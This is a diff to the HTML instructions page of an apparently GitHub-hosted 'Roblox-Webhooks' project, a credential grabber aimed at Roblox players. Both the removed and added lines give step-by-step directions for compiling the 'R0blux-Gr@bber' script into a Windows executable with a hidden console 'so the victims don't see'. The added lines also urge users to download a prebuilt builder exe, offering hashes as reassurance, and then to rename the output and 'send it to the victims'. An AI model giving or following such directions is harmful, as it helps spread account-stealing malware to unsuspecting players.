@@ -169,19 +169,25 @@
   <h3>Installing using PyPI:</h3>
   <h3>To install the application run this line in cmd:</h3>
   <code>pip install auto-py-to-exe</code>
-  <h3>To open auto-py-to-exe run this line in cmd:</h3>
-  <code>auto-py-to-exe</code>
   <h1 id="pytoexe">Put into exe.</h1>
-  <h3>Now once you open auto-py-to-exe.</h3>
-  <h3>You choose the python file.</h3>
-  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/0f4ffa81-f039-4a46-9290-ef071df32c1d" alt="Screenshot 5">
-  <h3>You select one file and hide the console so the victims don't see that is actually about to be hack on Roblox !</h3>
-  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/6b6e3972-1b44-41bf-a173-5fdb62ac16d7" alt="Screenshot 6">
-  <h3>You know put a name to your file.</h3>
-  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/9edcc605-5502-4047-b451-b427e630c56e" alt="Screenshot 7">
-  <h3>Now the exe will be put into C:/user/(your user name)/output and then press convert.</h3>
-  <img src="https://github.com/independent-coder/Roblox-Webhooks/assets/127637860/b935b928-6bf1-45a6-8ef0-18c7b7cd3670" alt="Screenshot 8">
-  <h3>You wait about 1 min and it compile and ready to be send to the victim !</h3>
+  <h3>Now once you installed auto-py-to-exe.</h3>
+  <h3>You need to install RCG-EXE-Builder.exe</h3>
+  <h3>If you don't trust me, here is the MD5 and SHA-256 signatures and the source code of the EXE builder (Code by me).</h3>
+  <code>MD5: 510E3079A1CA9F3DAA1DCE03CE463667</code>
+  
+  <code>SHA-256: 65559EBB2530AA6ACD3CB68E5916E231A0E414D3D83A59F44AA4D5EFFE888F14</code>
+  
+  <a href="https://github.com/independent-coder/Roblox-Webhooks/blob/main/Source-Code/Source-code-RCG-EXE-Builder.py">Root/Source-Code/Source-code-RCG-EXE-Builder.py</a>
+
+  <h3>If you still don't trust me do it manually by googling "Compile py to exe"</h3>
+  <p>If you do it manually go to usage.</p>
+
+  <h3>Once you launch RCG-EXE-Builder.exe, you will need to put the R0blux-Gr@bber in the same location of the EXE file.</h3>
+  <h3>Now you put the output directory and optionally add a icon file to the exe.</h3>
+  <h3>Once you're ready click Generate EXE, the window should stop responding for 1 minuute, if you have an issue please add an issue <a href="https://github.com/independent-coder/Roblox-Webhooks/issues">Here</a>.</h3>
+<h3>Then go to the output folder and you should see R0blUx-Gr@bber.exe, rename it to whatever you want and send it to the victims.</h3>
+<h1>Now go to usage to know how to use it</h1>
+
 </div>
 
 
